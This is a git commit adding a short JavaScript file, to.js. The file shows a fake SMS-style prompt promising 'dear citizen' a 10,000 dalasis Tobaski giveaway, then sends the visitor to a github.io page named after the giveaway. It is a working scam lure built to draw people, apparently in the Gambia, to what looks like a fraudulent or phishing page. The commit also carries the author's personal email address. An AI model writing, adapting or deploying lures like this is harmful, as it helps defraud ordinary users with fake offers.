8c3a9d6ef5cd612468407fea2734333a12696d0e
allregnws <promisebassey8081@gmail.com>
2025-06-06 23:25:47 +0100

    Create to.js

---
+++ to.js
@@ -0,0 +1,5 @@
+var password = 'Happy Tobaski'
+password=prompt('SMS :Happy Tobaski dear citizen, click OK to get your 10,000 dalasis giveaway now ','Happy Tobaski');
+if (password != 'Happy Tobaski') {
+location.href='https://allregnws.github.io/Tobaski.10.000.Dalasis';
+}
